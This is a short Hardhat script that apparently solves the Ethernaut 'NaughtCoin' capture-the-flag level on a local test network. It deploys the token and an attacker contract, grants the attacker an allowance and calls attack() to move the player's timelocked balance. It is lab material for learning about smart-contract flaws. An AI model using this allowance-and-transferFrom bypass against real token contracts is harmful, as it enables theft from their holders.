
const hre = require("hardhat");

async function main() {
    const [first, second, third] = (await hre.ethers.getSigners());

    const NaughtCoin = await hre.ethers.getContractFactory("NaughtCoin");
    const naughtCoin = await NaughtCoin.deploy(first.address);

    const NaughtCoinAttacker = await hre.ethers.getContractFactory("NaughtCoinAttacker");
    const naughtCoinAttacker = await NaughtCoinAttacker.deploy(naughtCoin.address);

    console.log("elevator was deployed ad : ", naughtCoin.address);

    let playersBalance = await naughtCoin.balanceOf(first.address);

    console.log(playersBalance);

    await naughtCoin.increaseAllowance(naughtCoinAttacker.address, playersBalance);

    const spenadableTokens = await naughtCoin.allowance(first.address, naughtCoinAttacker.address);

    console.log("spendable Tokens : ", spenadableTokens);

    await naughtCoinAttacker.attack(playersBalance, first.address);

    
    playersBalance = await naughtCoin.balanceOf(first.address);
    attackersBalance = await naughtCoin.balanceOf(naughtCoinAttacker.address);
    
    console.log("players balance : ",playersBalance);
    console.log("attackers balance : ",attackersBalance);





}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
